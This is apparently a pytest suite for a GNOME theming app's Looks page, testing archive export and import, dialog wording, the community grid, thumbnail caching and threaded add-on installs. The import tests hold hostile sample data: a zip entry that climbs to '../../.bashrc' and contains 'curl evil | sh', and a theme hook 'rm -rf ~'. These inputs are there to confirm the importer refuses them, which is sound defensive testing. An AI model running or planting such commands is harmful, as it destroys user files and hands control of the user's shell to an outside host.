"""Getting a Look on and off this computer, and drawing the grid without a stall.

Six findings, all about the Looks page as a *place* rather than as an apply
path.

* **U7** — the format travels (``{{ home }}`` rewriting, the wallpaper copied
  in, a scan for anything private) and there was no way to move one: no export,
  no import, and the save toast did not even name the folder to copy by hand.
* **U7 / P1** — a saved Look's dialog listed what was left out twice, once
  counted by reason and once again as a sentence, because the structured
  omission list was rendered by nobody.
* **U2** — the "Get more" grid showed the four Looks that came with the app,
  each badged "Already on this computer", each bouncing the user back when
  clicked. The honest empty state written for this page was unreachable.
* **M8** — every tile decoded a full-resolution screenshot on the thread that
  draws the window, on open and after every change, with no cache.
* **M9** — the add-on batch unzipped and ran ``gnome-extensions install`` on
  that same thread, inside a download callback, behind its own progress dialog.
* **X1** — the transaction's installer seam existed and nothing ever filled it,
  so installing an add-on and configuring it needed two applies.

Marked ``gtk``: the page module imports libadwaita. Nothing is presented, and
nothing here reads or writes the desktop running the suite.
"""

from __future__ import annotations

import base64
import threading
import time
import zipfile
from pathlib import Path
from typing import Any

import pytest

pytest.importorskip("gi", reason="PyGObject is needed for the Looks page")

import gi  # noqa: E402

gi.require_version("Gtk", "4.0")
gi.require_version("Adw", "1")
from gi.repository import Adw, GLib, Gtk  # noqa: E402

from gtheme.core.backends import use_backend  # noqa: E402
from gtheme.core.settings_backend import MemoryBackend  # noqa: E402
from gtheme.core.transaction import ExtensionInstall, Transaction  # noqa: E402
from gtheme.ego.install import InstallOutcome, InstallReport  # noqa: E402
from gtheme.prefs import Prefs  # noqa: E402
from gtheme.preset import registry as look_registry  # noqa: E402
from gtheme.preset.capture import CaptureResult, Omission  # noqa: E402
from gtheme.preset.loader import load  # noqa: E402
from gtheme.ui.applyrunner import ApplyRunner  # noqa: E402
from gtheme.ui.pages import looks  # noqa: E402

pytestmark = pytest.mark.gtk

#: The smallest real PNG there is. A picture the thumbnail store can be asked
#: about has to be a picture on disk.
ONE_PIXEL_PNG = base64.b64decode(
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9"
    "awAAAABJRU5ErkJggg=="
)


@pytest.fixture(autouse=True, scope="module")
def _adw():
    if not Gtk.init_check():
        pytest.skip("no display is available for GTK — run under gtk4-broadwayd")
    Adw.init()


@pytest.fixture
def backend():
    with use_backend(MemoryBackend()) as memory:
        yield memory


@pytest.fixture
def themes_dir(tmp_path, monkeypatch):
    path = tmp_path / "themes"
    path.mkdir()
    monkeypatch.setenv("GTHEME_THEMES_DIR", str(path))
    return path


THEME = """
format = 2

[meta]
name = "{name}"
title = "{title}"
description = "A Look written by a test."
author = "tests"
version = "1.0.0"
screenshots = [{shots}]

[palette]
bg = "#101010"
accent = "#52E0A4"

[[settings]]
key = "gsettings:org.gnome.desktop.interface accent-color"
value = "'green'"
component = "colors"
"""


def write_look(directory: Path, *, name="testlook", title="Test Look", shot=False) -> Path:
    folder = directory / name
    folder.mkdir(parents=True)
    if shot:
        (folder / "shot.png").write_bytes(ONE_PIXEL_PNG)
    (folder / "theme.toml").write_text(
        THEME.format(name=name, title=title, shots='"shot.png"' if shot else ""),
        encoding="utf-8",
    )
    return folder


class FakeWindow:
    """Everything the page asks of a window. The runner finishes inline."""

    def __init__(self, *, shell: Any = None) -> None:
        self.prefs = Prefs()
        self.toasts = Adw.ToastOverlay()
        self.runner = ApplyRunner(None, threaded=False)
        self.shell = shell
        self.visited: list[str] = []

    def show_page(self, page_id: str) -> None:
        self.visited.append(page_id)


def capture_toasts(action) -> list[Adw.Toast]:
    seen: list[Adw.Toast] = []
    original = Adw.ToastOverlay.add_toast
    Adw.ToastOverlay.add_toast = lambda _self, toast: seen.append(toast)
    try:
        action()
    finally:
        Adw.ToastOverlay.add_toast = original
    return seen


# ── U7: a Look can be moved ───────────────────────────────────────────────


def test_a_look_written_to_a_file_comes_back_out_of_it(tmp_path, themes_dir, backend):
    """Round trip through the same door a downloaded Look uses."""
    folder = write_look(tmp_path / "source", name="seaglass", title="Seaglass", shot=True)

    archive = looks.export_archive(folder, tmp_path / f"seaglass{looks.ARCHIVE_SUFFIX}")
    assert archive.is_file()

    entry, files = looks.look_from_archive(archive)
    assert entry.name == "seaglass"
    assert entry.title == "Seaglass"
    assert set(files) == {"theme.toml", "shot.png"}

    landed = look_registry.install_look(entry, files, into=themes_dir)
    assert (landed / "theme.toml").is_file()
    assert load(landed).preset is not None, "what installs must be what opens"


def test_a_zip_somebody_made_by_hand_opens_too(tmp_path, themes_dir):
    """Their zip holds ``seaglass/theme.toml``; ours holds ``theme.toml``."""
    folder = write_look(tmp_path / "source", name="seaglass", title="Seaglass")
    archive = tmp_path / "by-hand.zip"
    with zipfile.ZipFile(archive, "w") as out:
        out.write(folder / "theme.toml", arcname="seaglass/theme.toml")

    entry, files = looks.look_from_archive(archive)

    assert entry.name == "seaglass"
    assert set(files) == {"theme.toml"}


def test_a_file_that_climbs_out_of_its_own_folder_is_refused(tmp_path):
    """The bytes came from somebody else. Unpacking is where that stops."""
    archive = tmp_path / "hostile.zip"
    with zipfile.ZipFile(archive, "w") as out:
        out.writestr("theme.toml", "format = 2\n")
        out.writestr("../../.bashrc", "curl evil | sh\n")

    with pytest.raises(look_registry.LookFetchError) as refused:
        looks.look_from_archive(archive)
    assert "outside" in str(refused.value)


def test_a_file_with_no_look_in_it_says_so_rather_than_raising_something_odd(tmp_path):
    archive = tmp_path / "holiday.zip"
    with zipfile.ZipFile(archive, "w") as out:
        out.writestr("photo.jpg", "not a look")

    with pytest.raises(look_registry.LookFetchError) as refused:
        looks.look_from_archive(archive)
    assert looks.COPY["import-not-a-look"] in str(refused.value)


def test_a_look_that_does_not_validate_never_reaches_the_looks_folder(tmp_path):
    """The loader is the gate, and it is the same loader the app opens with."""
    archive = tmp_path / "broken.zip"
    with zipfile.ZipFile(archive, "w") as out:
        out.writestr("theme.toml", 'format = 2\n[meta]\nname = "x"\n[hooks]\nrun = "rm -rf ~"\n')

    with pytest.raises(look_registry.LookFetchError):
        looks.look_from_archive(archive)


def test_the_export_writes_nothing_at_all_when_it_cannot_finish(tmp_path):
    """No half-written file left behind with a real name on it."""
    folder = write_look(tmp_path / "source", name="seaglass")
    target = tmp_path / "out" / "seaglass.gtheme.zip"

    original = zipfile.ZipFile.write

    def explode(self, *args, **kwargs):
        raise OSError("the disk filled up")

    zipfile.ZipFile.write = explode
    try:
        with pytest.raises(OSError):
            looks.export_archive(folder, target)
    finally:
        zipfile.ZipFile.write = original

    assert not target.exists()
    assert list(target.parent.iterdir()) == []


# ── U7: the save toast names the folder, and says each thing once ─────────


def test_the_save_toast_names_the_folder_it_wrote(tmp_path, themes_dir, backend):
    """The one workaround for having no export was copying that folder."""
    page = looks.build(FakeWindow())
    result = CaptureResult(preset=load(write_look(tmp_path / "s", name="mine")).preset)
    result.path = themes_dir / "mine"

    toasts = capture_toasts(lambda: page._save_finished("Mine", result, None))

    assert toasts, "saving is always confirmed"
    said = toasts[0].get_title()
    assert "Mine" in said
    assert str(themes_dir / "mine") in said


def test_what_a_saved_look_left_out_is_said_once_and_named(tmp_path, backend):
    """Fails on the old code: the dialog rendered ``warnings`` and nothing else.

    ``warnings`` counts settings by reason, because a setting's name is a
    schema path with no room in a sentence; the structured list is where the
    names survive, and it was rendered by nobody. Showing both, unfiltered,
    says the same fact twice in two phrasings (P1).
    """
    from gtheme.preset.capture import PRIVATE_SETTING_REASON, _omission_notes

    page = looks.build(FakeWindow())
    omissions = [
        Omission(
            "setting",
            "org.gnome.desktop.lockdown disable-show-password",
            PRIVATE_SETTING_REASON,
        ),
        Omission("file", "~/.config/autostart/x.desktop", "a Look may not carry this"),
    ]
    counted = _omission_notes(omissions)
    assert any("one setting was left out" in note for note in counted), (
        "the prose form counts settings rather than naming them; that is the "
        "whole reason the structured list has to be rendered"
    )
    result = CaptureResult(
        preset=load(write_look(tmp_path / "s", name="mine")).preset,
        warnings=["your wallpaper picture was copied into this Look", *counted],
        omissions=omissions,
    )

    body = page.save_notes(result)

    assert "your wallpaper picture was copied into this Look" in body
    assert looks.COPY["save-notes-omitted"] in body
    assert "disable-show-password" in body, "the list is where the name survives"
    assert body.count("~/.config/autostart/x.desktop") == 1, "said once, not twice"
    assert "one setting was left out" not in body, "the counted prose is the double-say"


def test_omissions_are_grouped_by_what_kind_of_thing_they_are():
    sections = looks.omission_sections(
        [
            Omission("file", "~/.config/a", "one"),
            Omission("setting", "org.x key", "two"),
            Omission("file", "~/.config/b", "three"),
        ]
    )
    assert len(sections) == 2
    assert sections[0].startswith(looks.COPY["omitted-file"])
    assert "~/.config/a" in sections[0] and "~/.config/b" in sections[0]
    assert sections[1].startswith(looks.COPY["omitted-setting"])


# ── U2: the community grid stops being a mirror ───────────────────────────


def _entry(name: str, provenance: str) -> look_registry.IndexEntry:
    return look_registry.IndexEntry(
        name=name,
        title=name.title(),
        description="A Look.",
        author="somebody",
        version="1.0.0",
        screenshots=[f"{name}.png"],
        provenance=provenance,
    )


def test_a_list_of_only_built_in_looks_shows_the_honest_empty_state(
    tmp_path, themes_dir, backend
):
    """Fails on the old code: all four rendered, badged "Already on this computer"."""
    page = looks.build(FakeWindow())

    page._on_index([_entry("magma", "bundled"), _entry("netrunner", "bundled")], None)

    assert page._browse_stack.get_visible_child_name() == "empty"


def test_somebody_else_s_look_still_reaches_the_grid(tmp_path, themes_dir, backend):
    page = looks.build(FakeWindow())

    page._on_index([_entry("magma", "bundled"), _entry("seaglass", "community")], None)

    assert page._browse_stack.get_visible_child_name() == "results"
    tiles = []
    child = page._browse_grid.get_first_child()
    while child is not None:
        tiles.append(child)
        child = child.get_next_sibling()
    assert len(tiles) == 1


def test_a_community_tile_asks_for_the_real_picture(tmp_path, themes_dir, backend, monkeypatch):
    """Fails on the old code: every tile was drawn ``build_preview(palette=None)``."""
    asked: list[str] = []
    monkeypatch.setattr(look_registry, "cached_screenshot", lambda entry, **_k: None)
    monkeypatch.setattr(
        look_registry,
        "fetch_screenshot_async",
        lambda entry, on_done, **_k: asked.append(entry.name),
    )
    page = looks.build(FakeWindow())

    page._community_tile(_entry("seaglass", "community"))

    assert asked == ["seaglass"]


# ── M8: tiles go through the thumbnail store, and stay decoded ────────────


def test_a_look_tile_never_decodes_the_full_size_screenshot(
    tmp_path, themes_dir, backend, monkeypatch
):
    """Fails on the old code: ``build_preview`` was handed the 1440p file."""
    write_look(themes_dir, name="seaglass", shot=True)
    thumb = tmp_path / "thumb.png"
    thumb.write_bytes(ONE_PIXEL_PNG)
    asked: list[Path] = []

    from gtheme.system import thumbnails

    def looked_up(path, size="large"):
        asked.append(Path(path))
        return thumb

    monkeypatch.setattr(thumbnails, "lookup_cached_thumbnail", looked_up)
    monkeypatch.setattr(
        thumbnails,
        "request_thumbnail_async",
        lambda *_a, **_k: pytest.fail("the cached thumbnail was there; nothing should be generated"),
    )

    looks._TEXTURES.clear()
    looks.build(FakeWindow())

    assert themes_dir / "seaglass" / "shot.png" in asked, (
        "the tile asked the thumbnail store rather than decoding the screenshot"
    )
    assert looks._TEXTURES, "a tile with a picture ends up with a decoded picture"
    assert {key[0] for key in looks._TEXTURES} == {str(thumb)}, (
        "every texture the grid holds came out of the thumbnail store, not out "
        "of a 1440p screenshot"
    )


def test_a_picture_decoded_once_is_not_decoded_again(tmp_path):
    """The cache that survives ``reload()``, which runs after every change."""
    picture = tmp_path / "shot.png"
    picture.write_bytes(ONE_PIXEL_PNG)
    looks._TEXTURES.clear()

    first = looks._texture_for(picture)
    second = looks._texture_for(picture)

    assert first is not None
    assert first is second


def test_a_picture_that_cannot_be_read_costs_the_picture_and_not_the_tile(tmp_path):
    not_a_picture = tmp_path / "shot.png"
    not_a_picture.write_text("hello", encoding="utf-8")
    looks._TEXTURES.clear()

    assert looks._texture_for(not_a_picture) is None
    assert looks._texture_for(tmp_path / "missing.png") is None


# ── M9: the unpack runs off the thread that draws the window ─────────────


class RecordingLibrary:
    """A library that answers immediately and remembers who asked."""

    def __init__(self) -> None:
        self.threads: list[threading.Thread] = []

    def info(self, uuid: str, callback) -> None:
        self.threads.append(threading.current_thread())
        callback(_Record(), None)

    def download(self, uuid: str, version_tag: int, callback) -> None:
        self.threads.append(threading.current_thread())
        callback(b"a package", None)


class _Record:
    name = "Blur my shell"
    creator = "aunetx"

    def supports(self, _version: str) -> bool:
        return True

    def version_tag_for(self, _version: str) -> int:
        return 7


class UnpackingInstaller:
    """Shaped like the real installer, down to where the unpack happens."""

    def __init__(self, client: Any) -> None:
        self.client = client
        self.unpacked_on: list[threading.Thread] = []

    def plan_for_look(self, wanted, *, label=None):
        missing = [
            InstallReport(uuid, InstallOutcome.NEEDS_RELOGIN, "not added yet")
            for uuid, _source, _alternates in wanted
        ]
        return Transaction([], label=label), missing

    def install_package(self, uuid, version_tag, callback, *, alternates=(), label=None, brief=None):
        def downloaded(_body, _error):
            # In the real installer this is where the zip is written out and
            # ``gnome-extensions install`` is run — a subprocess, no timeout.
            self.unpacked_on.append(threading.current_thread())
            callback(
                InstallReport(
                    uuid, InstallOutcome.NEEDS_RELOGIN, "added", transaction=Transaction([])
                )
            )

        self.client.download(uuid, version_tag, downloaded)


def _run_off_the_main_thread(batch, wanted, seconds: float = 10.0):
    """Drive a batch from a worker while the main thread runs the loop."""
    landed: dict[str, Any] = {}

    def worker() -> None:
        try:
            landed["answer"] = batch.run_and_wait(wanted, timeout=seconds)
        except Exception as error:  # noqa: BLE001 - handed back to the assertion
            landed["error"] = error

    thread = threading.Thread(target=worker)
    thread.start()
    context = GLib.MainContext.default()
    deadline = time.monotonic() + seconds
    while thread.is_alive() and time.monotonic() < deadline:
        context.iteration(False)
        time.sleep(0.001)
    thread.join(seconds)
    assert not thread.is_alive(), "the batch never finished"
    if "error" in landed:
        raise landed["error"]
    return landed["answer"], thread


def test_the_unpack_does_not_run_on_the_thread_that_draws_the_window():
    """Fails on the old code: ``run_and_wait`` marshalled the whole batch back.

    Every leg of the batch — the library lookup, the download *and* the unpack
    that follows it — ran inside ``GLib.idle_add``, so the window stopped
    repainting behind its own progress dialog for the length of the batch.
    """
    library = RecordingLibrary()
    bridge = looks.MainLoopClient(library)
    installer = UnpackingInstaller(bridge)
    batch = looks.AddonBatch(
        installer, bridge, shell_version="50.4", label="Test Look", bridged=True
    )

    (_transaction, problems), worker = _run_off_the_main_thread(
        batch, [("blur-my-shell@aunetx", "ego", ())]
    )

    assert problems == []
    assert installer.unpacked_on == [worker], "the unpack belongs on the worker thread"
    assert library.threads and all(
        asked is threading.main_thread() for asked in library.threads
    ), "the network legs stay on the main loop, which is the only place they may run"


def test_the_bridge_calls_straight_through_on_the_main_thread():
    """A fake that answers at once must not need a loop to be running."""
    library = RecordingLibrary()
    answers: list[Any] = []

    looks.MainLoopClient(library).info("blur-my-shell@aunetx", lambda record, error: answers.append(record))

    assert len(answers) == 1
    assert library.threads == [threading.main_thread()]


# ── X1: the installer seam is filled only when somebody asked for it ─────


class RecordingTransaction:
    """A transaction that reports success and remembers what it was given."""

    def __init__(self) -> None:
        self.ops: list[Any] = []
        self.restore_point = "2026-08-28-120000"
        self.restore_warnings: list[str] = []
        self.cleanup_warnings: list[str] = []
        self.cleanup_kept = 0
        self.cleanup_dead = 0

    def apply(self, _report=None, **_kwargs):
        return self


def test_using_a_look_hands_the_transaction_no_installer(tmp_path, themes_dir, backend):
    """The ordinary press. A missing add-on stays a named skip."""
    write_look(themes_dir, name="seaglass")
    page = looks.build(FakeWindow())
    tile = page._tiles[0]
    transaction = RecordingTransaction()

    capture_toasts(lambda: page._apply(tile, transaction))

    assert getattr(transaction, "installer", None) is None


def test_asking_for_the_add_ons_hands_it_one(tmp_path, themes_dir, backend, monkeypatch):
    """Fails on the old code: nothing ever filled the seam (X1)."""
    write_look(themes_dir, name="seaglass")
    page = looks.build(FakeWindow(shell=object()))
    tile = page._tiles[0]
    transaction = RecordingTransaction()
    library = RecordingLibrary()
    monkeypatch.setattr(
        looks.LooksPage,
        "_addon_batch",
        lambda self, label: looks.AddonBatch(
            UnpackingInstaller(library), library, shell_version="50", label=label
        ),
    )
    plan = looks.ApplyPlan(
        title=tile.title,
        lines=["Icons"],
        missing_addons=1,
        missing=[("blur-my-shell@aunetx", "ego", ())],
        transaction=transaction,
    )

    capture_toasts(lambda: page._get_missing_addons(tile, plan))

    assert isinstance(transaction.installer, looks.LookAddons)


def test_one_add_on_that_will_not_arrive_is_reported_and_not_raised():
    """The Look still applies; the add-on is named as the thing that did not."""

    class Refuses:
        def run_and_wait(self, _wanted, **_kwargs):
            raise RuntimeError("the library stopped answering")

    addons = looks.LookAddons(Refuses())

    assert addons(ExtensionInstall(uuid="blur-my-shell@aunetx", source="ego")) is False
    assert [report.uuid for report in addons.problems] == ["blur-my-shell@aunetx"]
